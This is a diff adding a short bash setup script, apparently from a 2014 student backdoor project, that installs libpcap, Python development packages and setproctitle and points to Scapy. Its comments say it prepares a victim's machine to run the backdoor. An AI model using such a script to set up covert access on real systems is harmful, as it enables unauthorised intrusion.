@@ -1,0 +1,21 @@
+#!/bin/bash
+# SOURCE FILE: setup-bd
+# 
+# PROGRAM: backdoor setup script
+#
+# Last Modified: October 6, 2014
+#
+# DESIGNER: Slade Solobay & Zach Smoroden	
+#
+# PROGRAMMER: Slade Solobay & Zach Smoroden
+#
+# NOTES: This script will setup and install all the libraries required to run the backdoor.
+#	This script should be run on the victims machine. (note the additional library the user
+# must manually install)
+
+
+# Need to go to http://www.secdev.org/projects/scapy/files/scapy-latest.tar.gz and install
+yum install libpcap-devel -y
+yum install python-devel -y
+yum install python-pip -y
+pip install setproctitle
